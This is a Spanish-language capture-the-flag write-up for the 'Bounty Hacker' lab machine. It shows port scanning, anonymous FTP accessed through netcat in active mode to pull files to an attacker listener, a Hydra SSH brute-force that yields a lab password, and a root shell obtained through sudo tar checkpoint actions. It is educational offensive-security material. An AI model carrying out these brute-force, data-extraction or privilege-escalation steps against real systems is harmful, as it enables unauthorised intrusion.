# Bounty Hacker

Conceptos clave: Raw FTP Protocol (Active Mode), Anonymous Access, Custom Wordlist, SSH Brute-Force (Hydra), Sudo Privilege Escalation (tar checkpoint)
Dificultad: Fácil
Fecha: 22 de junio de 2026

## Resumen
Compromiso de la máquina **Bounty Hacker** (Linux) demostrando un profundo entendimiento de protocolos de red. Se detectó un acceso FTP anónimo y, frente a restricciones del servidor en modo pasivo (PASV), se interactuó con el protocolo a bajo nivel mediante `netcat` configurando un canal de datos en modo activo (`PORT`). Esto permitió extraer un archivo de tareas y un diccionario de contraseñas personalizado. Con esta información, se realizó un ataque de fuerza bruta por SSH para obtener acceso inicial. Finalmente, se escaló a `root` explotando un binario SUID/Sudo (`tar`) mediante la manipulación de *checkpoints*.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos y Servicios
Se inició la auditoría con un escaneo completo de puertos TCP, seguido de una detección de versiones y ejecución de scripts básicos sobre los puertos descubiertos:

```bash
nmap -p- --open -T4 -v -n <IP>
nmap -p 21,22,80 -sC -sV <IP>
```

**Hallazgos relevantes:**
* `21/tcp`: FTP (vsftpd 3.0.3). El script de Nmap indicó que permitía *Anonymous Login*.
* `22/tcp`: SSH (OpenSSH 7.2p2).
* `80/tcp`: HTTP (Apache 2.4.18).

---

## 2. Acceso Inicial (Initial Access)

### 2.1 Interacción Raw FTP (Modo Activo)
Se optó por auditar el servicio FTP. Para tener un control total de la comunicación, se conectó directamente mediante `netcat` en lugar de un cliente FTP estándar.

```bash
nc <IP> 21
USER anonymous
PASS anonymous
```
Al intentar listar los archivos (`LIST`), el servidor requirió establecer primero un canal de datos (error PASV/PORT). Al fallar el modo pasivo (`PASV`), se forzó una conexión en **Modo Activo**:
1. En la máquina atacante, se abrió un *listener* en un puerto alto (ej. 4444): `nc -nlvp 4444`.
2. En la consola FTP, se envió el comando `PORT` indicando la IP de la interfaz VPN (`tun0`) y el puerto en formato octeto:
   `PORT h1,h2,h3,h4,p1,p2`
3. Se ejecutó `LIST` y, posteriormente, `RETR Stack.txt` y `RETR log.txt`, recibiendo el contenido de los archivos directamente en el *listener* de la máquina atacante.

**Análisis de exfiltración:**
* `Stack.txt`: Reveló el nombre de usuario de un desarrollador (`lin`).
* `log.txt`: Contenía una lista de posibles contraseñas personalizadas.

### 2.2 Ataque de Fuerza Bruta SSH (Hydra)
Con un usuario válido y un diccionario específico (`log.txt`), se procedió a realizar un ataque de fuerza bruta contra el servicio SSH:

```bash
hydra -l lin -P log.txt ssh://<IP>
```
**Resultado:** Se obtuvo la credencial válida `lin : RedDr4gonSynd1cat3`. Accediendo vía SSH con estas credenciales se obtuvo la primera bandera (`user.txt`).

---

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración Sudo
Ya dentro de la máquina, se comprobaron los privilegios de ejecución administrativos del usuario actual:

```bash
sudo -l
```
El usuario `lin` tenía permisos para ejecutar el binario `/bin/tar` como administrador (`root`) sin necesidad de contraseña.

### 3.2 Explotación (Abuso de Tar Checkpoint)
El binario `tar` incluye una funcionalidad de *checkpoints* que permite ejecutar comandos de sistema tras archivar un número determinado de registros. Aprovechando esta funcionalidad documentada en **GTFOBins**, se construyó un *payload* para generar una *shell* interactiva:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Resultado:** Al procesar el comando, `tar` ejecutó `/bin/sh` bajo el contexto de `root`. Se obtuvo una *shell* administrativa completa, permitiendo el acceso al directorio `/root` y capturando la bandera final (`root.txt`).
